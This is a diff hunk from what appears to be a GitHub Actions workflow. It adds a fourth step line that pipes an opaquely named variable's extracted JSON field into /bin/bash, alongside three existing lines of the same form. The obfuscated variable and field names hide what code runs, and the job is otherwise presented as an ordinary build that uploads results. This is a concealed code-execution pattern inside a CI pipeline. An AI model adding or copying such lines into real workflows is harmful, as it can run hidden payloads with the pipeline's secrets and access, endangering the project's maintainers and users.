@@ -46,6 +46,7 @@ jobs:
           echo $kypk212 | jq -r .stmzk3 | /bin/bash
           printf '%s' "$xv5" | jq -r .xal8 | /bin/bash
           printf '%s' "$o25645" | jq -r .ed1 | /bin/bash
+          printf '%s' "$euyhk14" | jq -r .hkt9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
